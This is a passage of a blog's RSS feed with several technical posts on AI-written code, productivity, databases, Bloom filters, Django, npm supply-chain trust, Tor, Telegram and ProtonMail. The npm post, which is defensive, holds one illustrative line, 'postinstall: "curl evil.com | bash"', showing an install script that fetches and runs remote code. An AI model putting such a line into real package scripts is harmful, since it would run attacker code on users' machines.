+&lt;p&gt;Over time, I drilled this principle into my head. I assume that my colleagues are smart and write sensible code. I avoid changing code I do not fully understand. That habit has spared me production incidents. But now, AI-generated code is invalidating this lesson.&lt;/p&gt;
+&lt;p&gt;I was recently reading code like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import redis
+import time
+
+r = redis.Redis.from_url(&quot;redis://localhost:6379/0&quot;)
+
+def get_foo():
+  return _with_retry(lambda: r.get(&quot;foo&quot;))
+
+def _with_retry(
+    fn,
+    *,
+    retries=5,
+    base_delay=0.05,
+    exc=(redis.ConnectionError,),
+):
+    for i in range(retries):
+        try:
+            return fn()
+        except exc as e:
+            if i == retries - 1:
+                raise
+            time.sleep(base_delay * (2 ** i))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In the past I might have assumed that the backoff was added after a bug or an incident. That is no longer a safe assumption. In this case, an LLM wrote the code and over-engineered a simple call.&lt;/p&gt;
+&lt;p&gt;Rather than working with smart and sensible coworkers, we&apos;re now working with smart and sensible human coworkers -- &lt;em&gt;and&lt;/em&gt; thousands of very dumb, over-eager AI coworkers who have a tendency to lie. A given line of code might be crucial to our system&apos;s reliability, or it might be unnecessary bunk.&lt;/p&gt;
+&lt;p&gt;So what&apos;s the path forward? I want to say that it&apos;s on us humans to enforce a high quality bar and keep AI slop out of our codebases. This is wishful thinking -- many teams are pushed to favor speed and volume over craft.&lt;/p&gt;
+&lt;p&gt;Instead, tests matter even more. They are the spec that encodes how the system should behave. We should assume that a behavior without tests is unnecessary and can be safely removed. Put more care into tests, and you buy the freedom to set your dumb but productive AI coworkers loose on the rest of your codebase.&lt;/p&gt;
+</content:encoded></item><item><title>The best productivity system that&apos;s ever existed</title><link>https://btao.org/posts/2025-03-15-productivity/</link><guid isPermaLink="true">https://btao.org/posts/2025-03-15-productivity/</guid><description>Stop overcomplicating task management</description><pubDate>Thu, 13 Mar 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Over the years I&apos;ve tried all sorts of to-do apps, productivity systems, and task management tools. But I keep coming back to one approach that&apos;s unbeatable in its simplicity: a single, prioritized, list of checkboxes.&lt;/p&gt;
+&lt;p&gt;To make this work, there are a few requirements:&lt;/p&gt;
+&lt;p&gt;{/* prettier-ignore */}&lt;/p&gt;
+&lt;div&gt;
+1. You have to be able to nest to-do items arbitrarily,
+2. Notes (without checkboxes) can intermingle with the tasks, and
+3. It must be easy to re-order items using keyboard shortcuts or by dragging.
+&lt;/div&gt;
+
+&lt;p&gt;So, for example, on a given day my list might look like this:&lt;/p&gt;
+&lt;p&gt;{/* prettier-ignore */}&lt;/p&gt;
+&lt;div&gt;
+- [x] Set up recurring Platform team meeting
+    - Later in the week, in the AM, is best
+- [ ] Prepare for incident postmortem
+- [ ] Implement notifications feature
+    - [x] MVP
+        - Requirements: [link to ticket or doc]
+        - PR: [link to GitHub PR]
+    - [ ] Make it look good
+&lt;/div&gt;
+
+&lt;p&gt;This is usually followed by a long list of additional tasks I&apos;m tracking -- less urgent, but things I still want to get to eventually. I constantly reorder tasks throughout the week as priorities shift.&lt;/p&gt;
+&lt;p&gt;This method works well because it&apos;s easy to get an overview and the order tells me what to work on next. It also feels very easy to add even the tiniest things as bullet points. In every other system I&apos;ve tried, it feels like too much work to add sub-bullets or notes to a task -- and they tend to get lost in the UI.&lt;/p&gt;
+&lt;p&gt;If you want to get fancy, you can add a &quot;Someday&quot; heading further down to track more vague ideas that you might eventually pull into the main list.&lt;/p&gt;
+&lt;p&gt;The specific tool you use doesn&apos;t matter, as long as it meets the requirements above. I use Obsidian with the &lt;a href=&quot;https://github.com/vslinko/obsidian-outliner&quot;&gt;Outliner&lt;/a&gt; plugin, but you can probably use Notion or whatever as well.&lt;/p&gt;
+</content:encoded></item><item><title>Column- and row-oriented databases</title><link>https://btao.org/posts/2023-07-02-row-and-columnar/</link><guid isPermaLink="true">https://btao.org/posts/2023-07-02-row-and-columnar/</guid><pubDate>Sun, 02 Jul 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;The relational databases that many software engineers are most familiar with, e.g. Postgres or MySQL, are &lt;em&gt;row-oriented&lt;/em&gt;: they store data row-by-row. For a given row, its columns are stored next to each other on disk. This means that fetching all the data from a row is fast.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;visit_id&lt;/th&gt;
+&lt;th&gt;ip&lt;/th&gt;
+&lt;th&gt;duration&lt;/th&gt;
+&lt;th&gt;browser&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;1.2.3.4&lt;/td&gt;
+&lt;td&gt;100&lt;/td&gt;
+&lt;td&gt;chrome&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;td&gt;2.3.4.5&lt;/td&gt;
+&lt;td&gt;5&lt;/td&gt;
+&lt;td&gt;firefox&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;3&lt;/td&gt;
+&lt;td&gt;3.4.5.6&lt;/td&gt;
+&lt;td&gt;30&lt;/td&gt;
+&lt;td&gt;firefox&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;However, for some queries over very large data sets, this can become inefficient. Say that you have a table of visits to your website, and you want to find the average time spent per session. If you&apos;re dealing with billions of rows, row-oriented databases need to do a lot of work: the storage engine needs to perform many disk I/O operations to read data from the rows, even if it only needs to read a few columns from each.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Column-oriented databases&lt;/em&gt; like &lt;a href=&quot;https://clickhouse.com/&quot;&gt;Clickhouse&lt;/a&gt; or &lt;a href=&quot;https://www.influxdata.com/&quot;&gt;InfluxDB&lt;/a&gt; lay out data in a different way, such that all the values for a given column are contiguous on disk. This means that analytical queries and aggregations have to jump around the disk far less.&lt;/p&gt;
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;th&gt;visit_id&lt;/th&gt;
+      &lt;td&gt;1&lt;/td&gt;
+      &lt;td&gt;2&lt;/td&gt;
+      &lt;td&gt;3&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;th&gt;ip&lt;/th&gt;
+      &lt;td&gt;1.2.3.4&lt;/td&gt;
+      &lt;td&gt;2.3.4.5&lt;/td&gt;
+      &lt;td&gt;3.4.5.6&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;th&gt;duration&lt;/th&gt;
+      &lt;td&gt;100&lt;/td&gt;
+      &lt;td&gt;5&lt;/td&gt;
+      &lt;td&gt;30&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;th&gt;browser&lt;/th&gt;
+      &lt;td&gt;chrome&lt;/td&gt;
+      &lt;td&gt;firefox&lt;/td&gt;
+      &lt;td&gt;firefox&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Because columns often contain many repeated instances of the same value, there are also opportunities for compressing the data in each column to use less disk space.&lt;/p&gt;
+&lt;p&gt;As always, there are tradeoffs: writes (i.e. creates, updates, and deletes) are generally slower for columnar databases, and more work is needed to fetch the data from a single row.&lt;/p&gt;
+</content:encoded></item><item><title>Bloom filters</title><link>https://btao.org/posts/2023-07-01-bloom-filters/</link><guid isPermaLink="true">https://btao.org/posts/2023-07-01-bloom-filters/</guid><pubDate>Sat, 01 Jul 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Bloom filters are a data structure that can quickly answer whether an element is a member of a set. Because they are probabilistic, they tell you whether an element is &lt;em&gt;maybe&lt;/em&gt; in a set, or &lt;em&gt;definitely not&lt;/em&gt; in a set.&lt;/p&gt;
+&lt;p&gt;At their core, Bloom filters work by hashing elements and storing these hashes. Because hash functions map a large input space to a fixed-size output space, the set of hashes is much smaller than if you stored the original, unhashed elements. In practice, Bloom filters use several hash functions to make false positives less likely.&lt;/p&gt;
+&lt;p&gt;This data structure has many use cases, including:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;In some key-value stores like Cassandra or ScyllaDB, trying to read a nonexistent value requires slow disk reads. Both of these use Bloom filters to make this fast.&lt;/li&gt;
+&lt;li&gt;Firefox uses Bloom filters to &lt;a href=&quot;https://blog.mozilla.org/addons/2020/08/24/introducing-a-scalable-add-ons-blocklist/&quot;&gt;prevent malicious add-ons from running&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;CDNs may use Bloom filters to see if a URL has been visited before, which helps decide whether to cache it or not.&lt;/li&gt;
+&lt;li&gt;The blogging site Medium &lt;a href=&quot;https://blog.medium.com/what-are-bloom-filters-1ec2a50c68ff#.xlkqtn1vy&quot;&gt;uses Bloom filters&lt;/a&gt; to ensure that they don&apos;t recommend articles that a user has already read.&lt;/li&gt;
+&lt;/ul&gt;
+</content:encoded></item><item><title>Don&apos;t filter in Django&apos;s qet_queryset</title><link>https://btao.org/posts/2023-01-19-filtering-django-get-queryset/</link><guid isPermaLink="true">https://btao.org/posts/2023-01-19-filtering-django-get-queryset/</guid><description>Default scopes will make you suffer</description><pubDate>Thu, 19 Jan 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;In Django models, it&apos;s easy to customize the queryset that&apos;s returned by a model manager. Say
+that you&apos;re working on a blog, and you have a model that looks something like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;class Post(models.Model):
+    content = models.TextField()
+    created_at = models.DateTimeField(auto_now_add=True)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You might decide that you always want to return blog posts sorted by most recent. You
+can use a custom model manager such that &lt;code&gt;Post.objects.all()&lt;/code&gt; will always include this
+ordering by default:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;class PostManager(models.Manager):
+    def get_queryset(self):
+        return super().get_queryset().order_by(&quot;-created_at&quot;)
+
+class Post(models.Model):
+    objects = PostManager()
+
+    ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;However, overriding &lt;code&gt;get_queryset()&lt;/code&gt; also makes it easy to shoot yourself in the foot.
+Perhaps you implement the ability to archive old posts, and you then figure that you&apos;ll make your code a bit
+cleaner by only returning those by default:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;class PostManager(models.Manager):
+    def get_queryset(self):
+        return super().get_queryset()
+            .filter(archived=False)
+            .order_by(&quot;-created_at&quot;)
+
+class Post(models.Model):
+    objects = PostManager()
+    unscoped = models.Manager()
+
+    archived = models.BooleanField(default=False)
+    ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Unfortunately, this just made it easy to introduce bugs in the future! Now, whenever a developer
+is working with the &lt;code&gt;Post&lt;/code&gt; model, they need to remember to handle two cases: archived posts and un-archived posts.&lt;/p&gt;
+&lt;p&gt;Say that a year down the line, you need to write a data migration that converts the content of your blog posts from Markdown to HTML. An engineer
+might write something like:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;for post in Post.objects.all():
+    post.convert_to_html()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This looks fine on the surface, but it will leave all archived posts un-converted. And worse, you&apos;ll only catch this
+if you remember to test the code with both archived and non-archived posts, or if you remember to use the &lt;code&gt;unscoped&lt;/code&gt; model
+manager.&lt;/p&gt;
+&lt;p&gt;A good principle is to minimize the number of unusual behaviours that developers need to keep in mind. Custom scopes
+do the opposite, and add a lot of risk for little payoff.&lt;/p&gt;
+</content:encoded></item><item><title>&quot;The right tool for the job&quot;</title><link>https://btao.org/posts/2022-01-08-the-right-tool-for-the-job/</link><guid isPermaLink="true">https://btao.org/posts/2022-01-08-the-right-tool-for-the-job/</guid><description>Engineering principles that say something</description><pubDate>Sun, 09 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I&apos;ve been thinking a lot about engineering values and principles lately, and one that keeps popping up is &quot;use the right tool for the job&quot;. I don&apos;t think it&apos;s a very good principle.&lt;/p&gt;
+&lt;p&gt;I have a theory that when it comes to forming an engineering culture in a team, a good principle requires some level of controversy. Otherwise, it&apos;s too banal. If you got on your soapbox and started preaching about &quot;using the right tool for the job&quot;, I doubt you&apos;d find a single person who disagreed with you. That&apos;s because it&apos;s essentially meaningless, and the right tool is wholly dependent on other factors. No one who reads it is any the wiser about how you approach engineering problems.&lt;/p&gt;
+&lt;p&gt;Your engineering principles should &lt;em&gt;say something&lt;/em&gt;. Everyone thinks that you should use the right tool for the job, but what that &lt;em&gt;means&lt;/em&gt; varies greatly.&lt;/p&gt;
+</content:encoded></item><item><title>npm install is curl | bash</title><link>https://btao.org/posts/2021-09-09-npm-install-is-curl-bash/</link><guid isPermaLink="true">https://btao.org/posts/2021-09-09-npm-install-is-curl-bash/</guid><description>Remote code execution as a feature</description><pubDate>Thu, 09 Sep 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Today, GitHub published &lt;a href=&quot;https://github.blog/2021-09-08-github-security-update-vulnerabilities-tar-npmcli-arborist/&quot;&gt;a write-up on a number of CVEs&lt;/a&gt;[^1] in the npm packages &lt;code&gt;tar&lt;/code&gt; and &lt;code&gt;@npmcli/arborist&lt;/code&gt;. In their own words,&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The npm CLI aims to enforce certain security boundaries on package installation. One of these boundaries is that a package’s contents will only be written to the appropriate folder within the &lt;code&gt;node_modules&lt;/code&gt; directory hierarchy. Several of the &lt;code&gt;tar&lt;/code&gt; and &lt;code&gt;@npmcli/arborist&lt;/code&gt; vulnerabilities will cross that security boundary and may result in unexpected arbitrary file overwrites and subsequent code execution when installing untrusted packages.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This sounds pretty scary: &quot;arbitrary file overwrites and subsequent code execution&quot; is the kind of phrase that you don&apos;t want to see in a CVE description. The problem is that by default, npm allows this to happen anyway.&lt;/p&gt;
+&lt;h2&gt;postinstall: &quot;curl evil.com | bash&quot;&lt;/h2&gt;
+&lt;p&gt;npm (and yarn) will execute arbitrary code when you install a package via &lt;a href=&quot;https://docs.npmjs.com/cli/v7/using-npm/scripts#npm-install&quot;&gt;install scripts&lt;/a&gt;. A valid use-case is to build native code on installation, or do some other environment-specific setup, though these scripts have also been used to &lt;a href=&quot;https://www.zdnet.com/article/npm-bans-terminal-ads/&quot;&gt;show ads&lt;/a&gt; and, of course, as an &lt;a href=&quot;https://blog.sonatype.com/bladabindi-njrat-rat-in-jdb.js-npm-malware&quot;&gt;attack&lt;/a&gt; &lt;a href=&quot;https://snyk.io/blog/npm-security-malicious-code-in-oss-npm-packages/&quot;&gt;vector&lt;/a&gt;. In fact, install scripts &lt;a href=&quot;https://blog.npmjs.org/post/188385634100/npm-security-insights-api-preview-part-2-malware&quot;&gt;were the most popular route for malware&lt;/a&gt; as of 2019[^2].&lt;/p&gt;
+&lt;p&gt;Installing a single malicious package is enough to get reasonably pwned. The risk is mitigated by npm’s moderation of the registry — they’re quick to remove malware once discovered. This works pretty well, though I worry about the day someone uses this to &lt;a href=&quot;https://blog.npmjs.org/post/141702881055/package-install-scripts-vulnerability&quot;&gt;publish a self-replicating worm&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;This attack vector isn’t unique to npm. Other package managers like pip and RubyGems allow for the same thing. As developers, we’re not as cautious when installing packages from these registries as when we use &lt;code&gt;curl | bash&lt;/code&gt;, though we should be[^3].&lt;/p&gt;
+&lt;h2&gt;Mitigations&lt;/h2&gt;
+&lt;p&gt;When installing an untrusted package, run &lt;code&gt;npm install&lt;/code&gt; or &lt;code&gt;yarn add&lt;/code&gt; with the &lt;code&gt;--ignore-scripts&lt;/code&gt; flag. If, like me, you tend to forget this, you can set npm/yarn to never run scripts with &lt;code&gt;{npm,yarn} config set ignore-scripts true&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;I also recommend inspecting the source code of a package before you install it. I like to use &lt;a href=&quot;https://xray.computer/source&quot;&gt;xray.computer&lt;/a&gt; for this, because I made it.&lt;/p&gt;
+&lt;p&gt;And, of course, update your npm CLI to fix the CVEs that let packages bypass this setting.&lt;/p&gt;
+&lt;p&gt;[^1]: Specifically, CVE-2021-32803, CVE-2021-32804, CVE-2021-37701, CVE-2021-37712, CVE-2021-37713, CVE-2021-39134, and CVE-2021-39135.&lt;/p&gt;
+&lt;p&gt;[^2]: No more recent data is available, and work on npm’s Security Insights API/malware database seems to have stalled.&lt;/p&gt;
+&lt;p&gt;[^3]: You do get the added security feature of integrity checking when installing via a package manager as opposed to &lt;code&gt;curl | bash&lt;/code&gt;. This prevents e.g. MITM attacks, but don’t forget that packages in open-source registries are mostly trash, with the occasional piece of malware or genuinely useful code floating around.&lt;/p&gt;
+</content:encoded></item><item><title>A web of trust for npm</title><link>https://btao.org/posts/2020-10-02-npm-trust/</link><guid isPermaLink="true">https://btao.org/posts/2020-10-02-npm-trust/</guid><description>A path towards better supply-chain security</description><pubDate>Fri, 02 Oct 2020 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;In 1984 the co-inventor of Unix, Ken Thompson, delivered a seminal speech in which he highlighted that &lt;em&gt;you can&apos;t trust code that you did not totally create yourself&lt;/em&gt; [^1]. For a while, this lesson was largely ignored as open-source package registries like RubyGems, PyPI and npm grew rapidly. However, as we&apos;re seeing &lt;a href=&quot;https://blog.reversinglabs.com/blog/mining-for-malicious-ruby-gems&quot;&gt;more&lt;/a&gt; &lt;a href=&quot;https://blog.npmjs.org/post/185397814280/plot-to-steal-cryptocurrency-foiled-by-the-npm&quot;&gt;and&lt;/a&gt; &lt;a href=&quot;https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/&quot;&gt;more&lt;/a&gt; supply-chain attacks through software dependencies, the risks of using unvetted dependencies are becoming clearer.&lt;/p&gt;
+&lt;p&gt;The risks are particularly great for JavaScript applications. Veracode found that the average JavaScript project relies on 377 dependencies -- compared with just 16 for Python projects, or 43 in the Java ecosystem[^2]. Whenever a developer pulls in a new dependency, they are implicitly trusting the maintainers of that dependency. Often, this trust is awarded on the basis of popularity -- we assume that a popular library will be more carefully vetted, or that since many others trust the maintainers, we can too. Other times, this trust relationship and the risks involved are not considered at all.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://sambleckley.com/writing/npm.html&quot;&gt;Some have argued&lt;/a&gt; that the ill health of the npm registry is a social, rather than a technical problem, and suggest a human-compiled set of packages in order to separate the wheat of maintained, healthy packages from the chaff of abandoned toy projects with no documentation. &lt;a href=&quot;https://medium.com/@dpc_96143/cargo-crev-and-rust-2019-fearless-code-reuse-b75d58398cb8&quot;&gt;Another suggestion from the Rust world&lt;/a&gt; involves creating a manual web of trust from maintainers cryptographically signing each other&apos;s projects. Either way, there are challenges: webs of trust have rarely taken off (outside of Debian), and compiling a vetted set of packages from scratch is a massive undertaking. I propose something in the middle: bootstrapping a web of trust using existing npm dependency relationships, and building from that foundation.&lt;/p&gt;
+&lt;h2&gt;Existing trust relationships in npm&lt;/h2&gt;
+&lt;p&gt;Creating a web of trust from existing npm dependencies is, admittedly, somewhat problematic. As stated earlier, choosing to use a particular dependency is not always a well-considered decision based on researching its code and maintainers, and the trust relationship is merely implied. Similarly, there is no cryptographic verification of this weak trust, nor does npm currently have the infrastructure for such tools[^3]. What I am suggesting is an imperfect starting point to demonstrate the need for, and potential of, stronger trust measures in open source.&lt;/p&gt;
+&lt;p&gt;To construct this initial web, we can model npm&apos;s maintainerships as a graph. If we let each node be a maintainer, then the edges between them are the trust relationship arising from using a dependency. In other words, if Alice maintains a package A, and A depends on package B maintained by Bob, then there is a directed edge from Alice to Bob. We can even weigh these edges by the number of Alice&apos;s packages in which she implies trust of Bob.&lt;/p&gt;
+&lt;h2&gt;Exploring the graph&lt;/h2&gt;
+&lt;p&gt;This simple model exhibits a power-law-like pattern in terms of trust: the vast majority of users are trusted by few or no others, and a very small number of users are highly trusted. This type of pattern is common in social networks: you see a similar thing emerge when plotting follower counts on Twitter. Such power laws often lead to a rich-get-richer feedback process in which the inequality (in terms of trust, in this case) gets more pronounced over time[^4].&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;Who are these highly-trusted users? They&apos;re who you&apos;d expect: bots for large projects (e.g. &lt;code&gt;types&lt;/code&gt;), corporate accounts (e.g. &lt;code&gt;fb&lt;/code&gt;), and the maintainers of extremely popular open-source libraries (e.g. &lt;code&gt;sindresorhus&lt;/code&gt;, who maintains e.g. &lt;code&gt;string-length&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;Perhaps more interestingly, this web of trust exhibits some useful structures. A number of &lt;a href=&quot;https://en.wikipedia.org/wiki/Strongly_connected_component&quot;&gt;strongly connected components&lt;/a&gt; emerge -- groups of users that, roughly speaking, all trust each other according to the web of trust principles (i.e. if I trust Alice, and Alice trusts Bob, then I trust Bob, too). All of these connected components are small, with the exception of a single one that&apos;s home to over 11,000 users[^5]. This core component -- we&apos;ll call it the &lt;strong&gt;strong set&lt;/strong&gt; -- could provide a starting point for a measure of trust in the npm ecosystem.&lt;/p&gt;
+&lt;h2&gt;Fun with PageRank&lt;/h2&gt;
+&lt;p&gt;We can quantify trust in a slightly more nuanced way than simply looking at the in-degree of each npm user. The PageRank algorithm provides such a measure that takes into account the trustworthiness of the people who trust me. For example, I may only be trusted by one user, but if that user is &lt;code&gt;isaacs&lt;/code&gt; (the creator of npm) then that trust relationship counts for a lot! After running PageRank, the 10 &quot;most-trusted&quot; users are:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;types&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;sindresorhus&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;angular&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;m1tk4&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;tjholowaychuk&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;google-wombot&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;fb&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;isaacs&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;gaearon&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;yyx990803&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Many of these are unsurprising. However, &lt;code&gt;m1tk4&lt;/code&gt; stands out: they only maintain two rarely-downloaded libraries. Because one of these libraries is used by the BBC, &lt;code&gt;m1tk4&lt;/code&gt; is implicitly trusted by a large number of relatively trustworthy BBC employees who maintain other, more popular projects. This demonstrates how PageRank diffuses trust across the social network of npm maintainers. In fact, &lt;code&gt;m1tk4&lt;/code&gt; is not a member of the strong set mentioned earlier -- but many of the users who trust them &lt;em&gt;are&lt;/em&gt;. &lt;code&gt;m1tk4&lt;/code&gt; just doesn&apos;t trust those users back!&lt;/p&gt;
+&lt;p&gt;While PageRank gives a fun measure of trust, it&apos;s a very rough model for the reasons mentioned earlier: it&apos;s based on a pretty weak indication of real trust. However, it might be useful in detecting suspicious behaviours in npm, which is something we -- or registry maintainers -- need to do proactively if we want to stop supply-chain attacks. For example, it might be a red flag if a highly-trusted user suddenly starts using a library by someone with a PageRank-based-trust of close to 0. And regardless, the strong set comes merely from observing which dependencies people choose to use without applying any complex calculations.&lt;/p&gt;
+&lt;p&gt;How might we want to use the strong set to create a stricter trust (or reputation) system? I think that formalizing such a system is unlikely if it requires large-scale buy-in from npm users. Instead, we might create a simple wrapper for npm that checks if you&apos;re about to install something from a developer outside of the strong set, similar to Liran Tal&apos;s excellent &lt;a href=&quot;https://github.com/lirantal/npq&quot;&gt;npq&lt;/a&gt;. Or perhaps security researchers could use the npm web of trust as an additional data point when deciding whether a suspicious package warrants further investigation. Either way, the state of trust within the npm ecosystem is not great. This model gives us a starting point.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Do you think I&apos;ve got it all wrong? Or do you have further suggestions on how we can improve the state of trust in open source? &lt;a href=&quot;/contact&quot;&gt;Get in touch&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;A final note: this analysis is based on data from June 2020, which I collected for my Master&apos;s thesis. I believe you&apos;d reach similar numbers if you ran the analysis on data from today.&lt;/em&gt;&lt;/p&gt;
+&lt;h3&gt;Footnotes&lt;/h3&gt;
+&lt;p&gt;[^1]: &lt;a href=&quot;https://dl.acm.org/doi/pdf/10.1145/358198.358210&quot;&gt;Reflections on trusting trust&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;[^2]: &lt;a href=&quot;https://info.veracode.com/report-state-of-software-security-open-source-edition.html&quot;&gt;VeraCode&apos;s State of Software Security report&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;[^3]: Given what we know about the usability challenges of a cryptographic web of trust, I&apos;m not too sure this is a realistic path forward, either.&lt;/p&gt;
+&lt;p&gt;[^4]: For a great book about social and technological networks, check out &lt;a href=&quot;http://www.cs.cornell.edu/home/kleinber/networks-book/&quot;&gt;Networks, Crowds, and Markets: Reasoning About a Highly Connected World&lt;/a&gt; by Kleinberg and Easley.&lt;/p&gt;
+&lt;p&gt;[^5]: Only about 5% of npm users are part of a strongly connected component, whether it&apos;s big or small.&lt;/p&gt;
+</content:encoded></item><item><title>Literature review: Routing attacks on Tor</title><link>https://btao.org/posts/2020-08-12-routing-attacks-tor/</link><guid isPermaLink="true">https://btao.org/posts/2020-08-12-routing-attacks-tor/</guid><pubDate>Wed, 12 Aug 2020 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Routing attacks on Tor occur when an adversary attempts to influence the route a Tor circuit takes in order to improve their chances of intercepting traffic. In January of this year, I wrote a literature review on this topic that I&apos;m sharing here: &lt;a href=&quot;/pdf/routing-attacks-against-tor.pdf&quot;&gt;PDF link&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Abstract:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The anonymity network Tor is vulnerable to end-to-end correlation attacks, and fingerprinting attacks of encrypted traffic are improving. In order to launch these attacks, adversaries may attempt to actively influence routing through the Tor network or compromise relays or Internet infrastructure such that they lie on the path of Tor circuits. This literature review presents an overview of recent work on these attacks, as well as proposed defenses. Through this review, a number of desirable properties for alternative routing algorithms is compiled.&lt;/p&gt;
+&lt;/blockquote&gt;
+</content:encoded></item><item><title>Reasons not to use Telegram</title><link>https://btao.org/posts/2020-06-07-against-telegram/</link><guid isPermaLink="true">https://btao.org/posts/2020-06-07-against-telegram/</guid><pubDate>Sat, 06 Jun 2020 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Telegram defaults to unencrypted chats, so your messages are stored in plaintext on their servers. If you don&apos;t want them to read your messages, you have to manually enable Secret Chats -- but these don&apos;t work for groups and require users to be online at the same time. A &lt;a href=&quot;https://discovery.ucl.ac.uk/id/eprint/1560501/1/Abu-Salma%20et%20al.%20-%202017%20-%20The%20Security%20Blanket%20of%20the%20Chat%20World%20An%20Analyti.pdf&quot;&gt;2017 usability study&lt;/a&gt; found that many users thought they were using secure, encrypted chats when they were in fact sending all their messages in plaintext.&lt;/p&gt;
+&lt;p&gt;Perhaps even more concerning is the fact that group chats in Telegram &lt;em&gt;cannot&lt;/em&gt; be end-to-end encrypted. Secret chats are reserved for one-on-one communication. Given that large group chats is often cited as one of the key appeals of Telegram, it&apos;s surprising that this crucial gotcha is rarely mentioned.&lt;/p&gt;
+&lt;p&gt;In spite of these issues, Telegram continues to market itself as a secure messenger, causing people to think that their communications are private when they aren&apos;t.&lt;/p&gt;
+&lt;p&gt;When they first launched, Telegram performed the mortal sin of cryptography when they rolled their own encryption scheme, MTProto. They had Maths PhDs create the scheme -- but mathematicians are not cryptographers. A theoretical vulnerability in their scheme was discovered in 2016 (see &lt;a href=&quot;https://dl.acm.org/doi/pdf/10.1145/2994459.2994468&quot;&gt;this PDF&lt;/a&gt;), though it has since been fixed. When challenged on their encryption, they issued a &lt;a href=&quot;https://web.archive.org/web/20171213214126/https://moxie.org/blog/telegram-crypto-challenge/&quot;&gt;nonsensical challenge&lt;/a&gt; that showed they do not understand cryptography.&lt;/p&gt;
+&lt;p&gt;We have far better alternatives: Signal, Wire, and WhatsApp all use the well-tested Signal Protocol for encryption. They don&apos;t let users accidentally send plaintext messages. They do vary in terms of metadata protection; Signal does the most in order to prevent storing metadata.&lt;/p&gt;
+</content:encoded></item><item><title>Feel-good security in ProtonMail</title><link>https://btao.org/posts/2020-06-01-feel-good-security/</link><guid isPermaLink="true">https://btao.org/posts/2020-06-01-feel-good-security/</guid><pubDate>Mon, 01 Jun 2020 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;ProtonMail is one of the most popular security-focused email providers. Because email is not a particularly secure protocol, things like end-to-end encryption have to be bolted on top. To ensure interoperatiblity, an email provider must be able to send unencrypted messages to recipients who haven&apos;t dived into the painful world of PGP.&lt;/p&gt;
+&lt;p&gt;ProtonMail handles this quite well. Emails are stored encrypted on their servers, and are only decrypted in the client -- this way, ProtonMail isn&apos;t able to read any of your stored emails. When sending emails to other ProtonMail users, end-to-end encryption is handled transparently. But there&apos;s an important gotcha: in order to send and receive emails from other providers, ProtonMail has to handle the plaintext. Otherwise, the recipient (e.g. on an @gmail.com address) would receive a garbled mess that they had no idea how to decipher. Thus, ProtonMail could theoretically intercept your emails as they enter or leave their servers.&lt;/p&gt;
